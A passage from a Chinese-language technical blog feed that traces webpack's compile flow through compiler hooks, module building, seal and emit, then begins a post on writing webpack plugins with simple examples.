FunctionModulePlugin().apply(compiler);</span><br><span class="line">        new NodeSourcePlugin(options.node).apply(compiler);</span><br><span class="line">        new LoaderTargetPlugin(options.target).apply(compiler);</span><br><span class="line">        ....</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>（4） run 开始编译(compiler.run)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// webpack/lib/webpack.js</span><br><span class="line">if (</span><br><span class="line">    options.watch === true ||</span><br><span class="line">    (Array.isArray(options) &amp;&amp; options.some(o =&gt; o.watch))</span><br><span class="line">) &#123;</span><br><span class="line">    const watchOptions = Array.isArray(options)</span><br><span class="line">        ? options.map(o =&gt; o.watchOptions || &#123;&#125;)</span><br><span class="line">        : options.watchOptions || &#123;&#125;;</span><br><span class="line">    return compiler.watch(watchOptions, callback);</span><br><span class="line">&#125;</span><br><span class="line">compiler.run(callback);</span><br></pre></td></tr></table></figure><p>实例compiler后根据options的watch判断是否启动了watch，如果启动watch了就调用compiler.watch来监控构建文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (</span><br><span class="line">    options.watch === true ||</span><br><span class="line">    (Array.isArray(options) &amp;&amp; options.some(o =&gt; o.watch))</span><br><span class="line">) &#123;</span><br><span class="line">    const watchOptions = Array.isArray(options)</span><br><span class="line">        ? options.map(o =&gt; o.watchOptions || &#123;&#125;)</span><br><span class="line">        : options.watchOptions || &#123;&#125;;</span><br><span class="line">    return compiler.watch(watchOptions, callback);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>这么分析来，webpack的实际入口是Compiler类的run方法</p></li><li><p>注： 这些事情都是在 webpack/lib/webpack.js做掉</p></li></ul><p>在 run 方法里做了哪些事情了 ？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//compiler.js 的 run 方法</span><br><span class="line">...</span><br><span class="line">this.hooks.beforeRun.callAsync(this, err =&gt; &#123;</span><br><span class="line">    if (err) return finalCallback(err);</span><br><span class="line"></span><br><span class="line">    this.hooks.run.callAsync(this, err =&gt; &#123;</span><br><span class="line">        if (err) return finalCallback(err);</span><br><span class="line"></span><br><span class="line">        this.readRecords(err =&gt; &#123;</span><br><span class="line">            if (err) return finalCallback(err);</span><br><span class="line"></span><br><span class="line">            this.compile(onCompiled);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">...</span><br><span class="line">后面会执行、触发 this.compile (见下面分析)</span><br></pre></td></tr></table></figure><h3 id="5-触发compile"><a href="#5-触发compile" class="headerlink" title="5.触发compile"></a>5.触发compile</h3><p>（1）在run的过程中，已经触发了一些钩子：beforeRun-&gt;run-&gt;beforeCompile（在complie方法中this.hooks.beforeCompile）-&gt;compile(this.hooks.beforeCompile回调中)-&gt;make-&gt;seal(compilation.seal)</p><ul><li>其中很多钩子已经注册。beforeCompile 在构建complier 时已经完成</li></ul><p>（2）构建了Compilation对象</p><p>在run()方法中，执行了this.compile（）</p><p>this.compile()中创建了compilation 见如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// complier.js 的 compile</span><br><span class="line">compile(callback) &#123;</span><br><span class="line">    const params = this.newCompilationParams();</span><br><span class="line">    this.hooks.beforeCompile.callAsync(params, err =&gt; &#123;</span><br><span class="line">        ...</span><br><span class="line">        //回到hook 里面，可以看看实现</span><br><span class="line">        this.hooks.compile.call(params);</span><br><span class="line">        const compilation = this.newCompilation(params);</span><br><span class="line">        // 这里触发make 分析入口等（见下面）</span><br><span class="line">        this.hooks.make.callAsync(compilation, err =&gt; &#123;</span><br><span class="line">            ...</span><br><span class="line">            compilation.finish();</span><br><span class="line">            compilation.seal(err =&gt; &#123;</span><br><span class="line">                ...</span><br><span class="line">                this.hooks.afterCompile.callAsync(compilation, err </span><br><span class="line">                    ...</span><br><span class="line">                    return callback(null, compilation);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>Compilation负责整个编译过程，包含了每个构建环节所对应的方法。对象内部保留了对compiler的引用。</p></li><li><p>当 Webpack 以开发模式运行时，每当检测到文件变化，一次新的 Compilation 将被创建。</p></li><li><p>Compilation很重要！编译生产资源变换文件都靠它。</p></li></ul><h3 id="6-addEntry-make-分析入口文件创建模块对象"><a href="#6-addEntry-make-分析入口文件创建模块对象" class="headerlink" title="6.addEntry() make 分析入口文件创建模块对象"></a>6.addEntry() make 分析入口文件创建模块对象</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//complier 中的 make钩子</span><br><span class="line">this.hooks.make = new AsyncParallelHook([&quot;compilation&quot;])</span><br></pre></td></tr></table></figure><p>compile中触发hooks.make(异步)事件并调用addEntry</p><p>webpack的make钩子中, tapAsync注册了一个DllEntryPlugin, 就是将入口模块通过调用compilation。（下面有注册代码）</p><p>这一注册在Compiler.compile()方法中被执行。</p><p>addEntry方法将所有的入口模块添加到编译构建队列中，开启编译流程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//DllEntryPlugin.js</span><br><span class="line">compiler.hooks.make.tapAsync(&quot;DllEntryPlugin&quot;, (compilation, callback) =&gt; &#123;</span><br><span class="line">    compilation.addEntry(</span><br><span class="line">        this.context,</span><br><span class="line">        new DllEntryDependency(</span><br><span class="line">            this.entries.map((e, idx) =&gt; &#123;</span><br><span class="line">                const dep = new SingleEntryDependency(e);</span><br><span class="line">                dep.loc = &#123;</span><br><span class="line">                    name: this.name,</span><br><span class="line">                    index: idx</span><br><span class="line">                &#125;;</span><br><span class="line">                return dep;</span><br><span class="line">            &#125;),</span><br><span class="line">            this.name</span><br><span class="line">        ),</span><br><span class="line">        this.name,</span><br><span class="line">        callback</span><br><span class="line">    );</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>解释下为什么流程走到这里</p><p>之前WebpackOptionsApply.process()初始化插件的时候，执行了compiler.hooks.entryOption.call(options.context, options.entry);</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//WebpackOptionsApply.js</span><br><span class="line">class WebpackOptionsApply extends OptionsApply &#123;</span><br><span class="line">    process(options, compiler) &#123;</span><br><span class="line">        ...</span><br><span class="line">        //这句是关键，注册entryOption钩子</span><br><span class="line">        new EntryOptionPlugin().apply(compiler);</span><br><span class="line">compiler.hooks.entryOption.call(options.context, options.entry);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是entryOption钩子 又是在哪里注册的呢？<br>答：在EntryOptionPlugin中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">compiler.hooks.entryOption.tap(&quot;EntryOptionPlugin&quot;, (context, entry) =&gt; &#123;</span><br><span class="line">    if (typeof entry === &quot;string&quot; || Array.isArray(entry)) &#123;</span><br><span class="line">        itemToPlugin(context, entry, &quot;main&quot;).apply(compiler);</span><br><span class="line">    &#125; else if (typeof entry === &quot;object&quot;) &#123;</span><br><span class="line">        for (const name of Object.keys(entry)) &#123;</span><br><span class="line">            itemToPlugin(context, entry[name], name).apply(compiler);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else if (typeof entry === &quot;function&quot;) &#123;</span><br><span class="line">        new DynamicEntryPlugin(context, entry).apply(compiler);</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>itemToPlugin =&gt; new SingleEntryPlugin(context, item, name)<br> =&gt; </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//SingleEntryPlugin</span><br><span class="line">compilation.dependencyFactories</span><br></pre></td></tr></table></figure><p>=&gt; compilation.addEntry(context, dep, name, callback);(这就到了构建莫板块)</p><p>流弊<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">各种插件穿梭</span><br></pre></td></tr></table></figure></p><h3 id="7-构建模块"><a href="#7-构建模块" class="headerlink" title="7. 构建模块"></a>7. 构建模块</h3><p>compilation.addEntry中执行 _addModuleChain() (下面有代码)这个方法主要做了两件事情。</p><p>一是根据模块的类型获取对应的模块工厂并创建模块，二是构建模块。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">//Compilation.js</span><br><span class="line">addEntry(context, entry, name, callback) &#123;</span><br><span class="line">    const slot = &#123;</span><br><span class="line">        name: name,</span><br><span class="line">        request: entry.request,</span><br><span class="line">        module: null</span><br><span class="line">    &#125;;</span><br><span class="line">    this._preparedEntrypoints.push(slot);</span><br><span class="line">    this._addModuleChain(</span><br><span class="line">        context,</span><br><span class="line">        entry,</span><br><span class="line">        module =&gt; &#123;</span><br><span class="line">            this.entries.push(module);</span><br><span class="line">        &#125;,</span><br><span class="line">        (err, module) =&gt; &#123;</span><br><span class="line">            if (err) &#123;</span><br><span class="line">                return callback(err);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (module) &#123;</span><br><span class="line">                slot.module = module;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                const idx = this._preparedEntrypoints.indexOf(slot);</span><br><span class="line">                this._preparedEntrypoints.splice(idx, 1);</span><br><span class="line">            &#125;</span><br><span class="line">            return callback(null, module);</span><br><span class="line">        &#125;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">=&gt; addModule(module, cacheGroup) =&gt; compilation.addModuleDependencies =&gt; </span><br><span class="line">后面是对于各个模块的解析等</span><br></pre></td></tr></table></figure><p>然后通过 ModuleFactory.create方法创建模块，比如创建了NormalModual(里面有loaders等)</p><p>然后调用里面的doBuild方法=》 runLoaders() (在这里面有个而loader-runner。这是webpack的loader运行器。) </p><p>打个断点</p><p>插播一下loader的运行总体流程</p><ul><li>使用loaderResolver解析loader模块路径</li><li>根据rule.modules创建RulesSet规则集</li><li>使用loader-runner运行loader</li></ul><p>继续断点~</p><p>然后对模块使用的loader进行加载。调用 acorn 解析经 loader 处理后的源文件生成抽象语法树 AST。遍历 AST，构建该模块所依赖的模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//NormalModual.js</span><br><span class="line">//产生source，生成语法树</span><br><span class="line">this._source = this.createSource(</span><br><span class="line">    this.binary ? asBuffer(source) : asString(source),</span><br><span class="line">    resourceBuffer,</span><br><span class="line">    sourceMap</span><br><span class="line">);</span><br><span class="line">this._ast =</span><br><span class="line">    typeof extraInfo === &quot;object&quot; &amp;&amp;</span><br><span class="line">    extraInfo !== null &amp;&amp;</span><br><span class="line">    extraInfo.webpackAST !== undefined</span><br><span class="line">        ? extraInfo.webpackAST</span><br><span class="line">        : null;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">//NormalModual.js</span><br><span class="line">//调用相应的loader对resource进行加工，生成一段js代码后交给acorn解析生成AST.所以不管是css文件，还是jpg文件，还是html模版，最终经过loader处理会变成一个module：一段js代码。</span><br><span class="line">return this.doBuild(options, compilation, resolver, fs, err =&gt; &#123;</span><br><span class="line">    //回调里面解析ast</span><br><span class="line">    try &#123;</span><br><span class="line">        // 有个Parse类，本质还是acorn</span><br><span class="line">        const result = this.parser.parse(</span><br><span class="line">            this._ast || this._source.source(),</span><br><span class="line">            &#123;</span><br><span class="line">                current: this,</span><br><span class="line">                module: this,</span><br><span class="line">                compilation: compilation,</span><br><span class="line">                options: options</span><br><span class="line">            &#125;,</span><br><span class="line">            (err, result) =&gt; &#123;</span><br><span class="line">                if (err) &#123;</span><br><span class="line">                    handleParseError(err);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    handleParseResult(result);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">        if (result !== undefined) &#123;</span><br><span class="line">            // parse is sync</span><br><span class="line">            handleParseResult(result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">        handleParseError(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="使用acorn生成AST，并遍历AST收集依赖"><a href="#使用acorn生成AST，并遍历AST收集依赖" class="headerlink" title="使用acorn生成AST，并遍历AST收集依赖"></a>使用acorn生成AST，并遍历AST收集依赖</h4><p>webpack使用acorn解析每一个经loader处理过的source，并且成AST</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">const ast = acornParser.parse(source, &#123;</span><br><span class="line">    ranges: true,</span><br><span class="line">    locations: true,</span><br><span class="line">    ecmaVersion: 2019,</span><br><span class="line">    sourceType: &quot;module&quot;,</span><br><span class="line">    onComment: comments</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>调用 loaders 对模块的原始代码进行编译，转换成标准的JS代码</li><li>调用 acorn 对JS代码进行语法分析，然后收集其中的依赖关系。每个模块都会记录自己的依赖关系，从而形成一颗关系树</li></ul><h3 id="8-封装构建结果（seal）"><a href="#8-封装构建结果（seal）" class="headerlink" title="8. 封装构建结果（seal）"></a>8. 封装构建结果（seal）</h3><p>webpack 会监听 seal事件调用各插件对构建后的结果进行封装，要逐次对每个 module 和 chunk 进行整理，生成编译后的源码，合并，拆分，生成 hash。webpack会根据不同的插件，如MinChunkSizePlugin,LimitChunkCountPlugin 将不同的module整理到不同的chunk里，每个chunk最终对应一个输出文件。 同时这是我们在开发时进行代码优化和功能添加的关键环节。</p><p>然后通过Template生成结果代码</p><p>插播一下Template</p><ul><li>Template是用来生成结果代码的。webpack中Template有四个子类：</li><li>MainTemplate.js 用于生成项目入口文件  </li><li>ChunkTemplate.js 用于生成异步加载的js代码  </li><li>ModuleTemplate.js 用于生成某个模块的代码  </li><li>HotUpdateChunkTemplate.js</li></ul><p><em>Template 也是 继承自Tapable，有render方法等</em></p><p>然后通过这些模板把chunk生产<strong>webpack_require</strong>的格式。</p><h3 id="9-输出资源（emit）"><a href="#9-输出资源（emit）" class="headerlink" title="9. 输出资源（emit）"></a>9. 输出资源（emit）</h3><p>webpack会在Compiler的emitAssets方法里把compilation.assets里的结果写到输出文件里，在此前会先创建输出目录(把Assets输出到output的path中)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">emitAssets(compilation, callback) &#123;</span><br><span class="line">    let outputPath;</span><br><span class="line">    const emitFiles = err =&gt; &#123;</span><br><span class="line">        if (err) return callback(err);</span><br><span class="line"></span><br><span class="line">        asyncLib.forEachLimit(</span><br><span class="line">            compilation.assets,</span><br><span class="line">            15,</span><br><span class="line">            (source, file, callback) =&gt; &#123;</span><br><span class="line">                ....</span><br><span class="line">                if (targetFile.match(/\/|\\/)) &#123;</span><br><span class="line">                    const dir = path.dirname(targetFile);</span><br><span class="line">                    this.outputFileSystem.mkdirp(</span><br><span class="line">                        this.outputFileSystem.join(outputPath, dir),</span><br><span class="line">                        writeOut</span><br><span class="line">                    );</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    writeOut();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            err =&gt; &#123;</span><br><span class="line">                if (err) return callback(err);</span><br><span class="line"></span><br><span class="line">                this.hooks.afterEmit.callAsync(compilation, err =&gt; &#123;</span><br><span class="line">                    if (err) return callback(err);</span><br><span class="line"></span><br><span class="line">                    return callback();</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    this.hooks.emit.callAsync(compilation, err =&gt; &#123;</span><br><span class="line">        if (err) return callback(err);</span><br><span class="line">        outputPath = compilation.getPath(this.outputPath);</span><br><span class="line">        this.outputFileSystem.mkdirp(outputPath, emitFiles);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>当要开发一些自定义的 插件要输出一些结果时，把文件放入compilation.assets里即可。</li></ul><h3 id="and-more"><a href="#and-more" class="headerlink" title="and more"></a>and more</h3><h4 id="memory-fs-内存文件系统"><a href="#memory-fs-内存文件系统" class="headerlink" title="memory-fs 内存文件系统"></a>memory-fs 内存文件系统</h4><p>是node原生fs模块内存版(in-memory)的完整功能实现。相比于从磁盘读写数据，memory-fs是内存缓存和快速数据处理的完美替代方案。</p><ul><li><p>webpack 通过自己实现的memory-fs将 bundle.js 文件打包到了内存中，访问内存中的代码文件也就更快，也减少了代码写入文件的开销。</p></li><li><p>memory-fs 是 webpack-dev-middleware 的一个依赖库，webpack-dev-middleware 将 webpack 原本的outputFileSystem 替换成了MemoryFileSystem实例，这样代码就将输出到内存中。</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//webpack-dev-middleware 中该部分代码</span><br><span class="line">//webpack-dev-middleware/lib/Shared.js</span><br><span class="line">var isMemoryFs = !compiler.compilers &amp;&amp; compiler.outputFileSystem instanceof MemoryFileSystem;</span><br><span class="line">if(isMemoryFs) &#123;</span><br><span class="line">    fs = compiler.outputFileSystem;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    fs = compiler.outputFileSystem = new MemoryFileSystem();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>首先判断当前 fileSystem 是否已经是 MemoryFileSystem 的实例，如果不是，用 MemoryFileSystem 的实例替换 compiler 之前的 outputFileSystem。这样 bundle.js 文件代码就作为一个简单 javascript 对象保存在了内存中，当浏览器请求 bundle.js 文件时，devServer就直接去内存中找到上面保存的 javascript 对象返回给浏览器端。</li></ul><p>关于webpack-dev-server 的核心内容</p><ul><li>webpack, 负责编译代码</li><li>webpack-dev-server，主要提供了 in-memory 内存文件系统，他会把webpack的outputFileSystem 替换成一个 inMemoryFileSystem，并且拦截全部的浏览器请求，从这个文件系统中把结果取出来返回。</li><li>express，作为服务器</li></ul><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>webpack的主要编译都按照下面的钩子调用顺序执行。</p><ul><li>Compiler:beforeRun 清除缓存</li><li>Compiler:run 注册缓存数据钩子</li><li>Compiler:beforeCompile</li><li>Compiler:compile 开始编译</li><li>Compiler:make 从入口分析依赖以及间接依赖模块，创建模块对象</li><li>Compilation:buildModule 模块构建</li><li>Compiler:normalModuleFactory 构建</li><li>Compilation:seal 构建结果封装， 不可再更改</li><li>Compiler:afterCompile 完成构建，缓存数据</li><li>Compiler:emit 输出到dist目录</li><li>一个 Compilation 对象包含了当前的模块资源、编译生成资源、变化的文件等。</li></ul><hr><p>and~~~</p><ul><li><p>Compilation 对象也提供了很多事件回调供插件做扩展。</p></li><li><p>Compilation中比较重要的部分是assets,如果我们要借助webpack来生成文件,就要在assets上添加对应的文件信息。</p></li></ul><p>参考：<a href="https://segmentfault.com/a/1190000017013855?utm_source=tag-newest" target="_blank" rel="noopener">干货！撸一个webpack插件(内含tapable详解+webpack流程)</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;webpack-原理&quot;&gt;&lt;a href=&quot;#webpack-原理&quot; class=&quot;headerlink&quot; title=&quot;webpack 原理&quot;&gt;&lt;/a&gt;webpack 原理&lt;/h1&gt;&lt;h2 id=&quot;webpack核心概念&quot;&gt;&lt;a href=&quot;#webpack核心概
      
    
    </summary>
    
    
      <category term="技术" scheme="http://swingboy.github.io/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>webpackPlugin</title>
    <link href="http://swingboy.github.io/2019/03/29/webpackPlugin/"/>
    <id>http://swingboy.github.io/2019/03/29/webpackPlugin/</id>
    <published>2019-03-29T12:48:37.000Z</published>
    <updated>2019-11-23T14:31:02.621Z</updated>
    
    <content type="html"><![CDATA[<h3 id="plugin"><a href="#plugin" class="headerlink" title="plugin"></a>plugin</h3><p>先把<a href="https://www.webpackjs.com/concepts/" target="_blank" rel="noopener">中文</a> 或<a href="https://webpack.js.org/contribute/writing-a-plugin/" target="_blank" rel="noopener">英文</a>文档看一下。</p><h3 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h3><p>如下方代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">const ProgressBarPlugin = require(&apos;progress-bar-webpack-plugin&apos;);</span><br><span class="line">module.exports = &#123;</span><br><span class="line">    mode: &apos;development&apos;,</span><br><span class="line">    plugins:[</span><br><span class="line">        new ProgressBarPlugin(&#123;</span><br><span class="line">            width: 5,</span><br><span class="line">        &#125;),</span><br><span class="line">    ],  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="什么是webpack-插件"><a href="#什么是webpack-插件" class="headerlink" title="什么是webpack 插件"></a>什么是webpack 插件</h3><p>webpack plugin是一个具有 apply 属性的 JavaScript 对象。apply 属性会被 webpack compiler 调用，并且 compiler 对象可在整个编译生命周期访问。</p><ul><li>webpack 插件机制是整个 webpack 工具的骨架，而 webpack 本身也是利用这套插件机制构建出来的。</li></ul><p>一个简单的插件结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">const pluginName = &apos;ConsoleLogOnBuildWebpackPlugin&apos;;</span><br><span class="line"></span><br><span class="line">class ConsoleLogOnBuildWebpackPlugin &#123;</span><br><span class="line">    apply(compiler) &#123;</span><br><span class="line">        compiler.hooks.run.tap(pluginName, compilation =&gt; &#123;</span><br><span class="line">            console.log(&quot;webpack 构建过程开始！&quot;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看一个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function HelloCompilationPlugin(options) &#123;&#125;</span><br><span class="line"></span><br><span class="line">HelloCompilationPlugin.prototype.apply = function(compiler) &#123;</span><br><span class="line"></span><br><span class="line">  // 设置回调来访问 compilation 对象：</span><br><span class="line">  compiler.plugin(&quot;compilation&quot;, function(compilation) &#123;</span><br><span class="line"></span><br><span class="line">    // 现在，设置回调来访问 compilation 中的步骤：</span><br><span class="line">    compilation.plugin(&quot;optimize&quot;, function() &#123;</span><br><span class="line">      console.log(&quot;Assets are being optimized.&quot;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">module.exports = HelloCompilationPlugin;</span><br></pre></td></tr></table></figure><p>有什么特点呢？ </p><p>我们看到了都有个Compiler 和 Compilation</p><h3 id="不得不说的-Compiler-和-Compilation"><a href="#不得不说的-Compiler-和-Compilation" class="headerlink" title="不得不说的 Compiler 和 Compilation"></a>不得不说的 Compiler 和 Compilation</h3><p>在插件开发中最重要的两个资源就是 compiler 和 compilation 对象。</p><h4 id="区别与联系"><a href="#区别与联系" class="headerlink" title="区别与联系"></a>区别与联系</h4><p>compiler 对象代表了完整的 webpack 环境配置。这个对象在启动 webpack 时被一次性建立，并配置好所有可操作的设置，包括 options，loader 和 plugin。当在 webpack 环境中应用一个插件时，插件将收到此 compiler 对象的引用。可以使用它来访问 webpack 的主环境。</p><p>而compilation 对象代表了一次资源版本构建。当运行 webpack 开发环境中间件时，每当检测到一个文件变化，就会创建一个新的 compilation，从而生成一组新的编译资源。一个 compilation 对象表现了当前的模块资源、编译生成资源、变化的文件、以及被跟踪依赖的状态信息。compilation 对象也提供了很多关键时机的回调，以供插件做自定义处理时选择使用。</p><ul><li>这两个组件是任何 webpack 插件不可或缺的部分（特别是 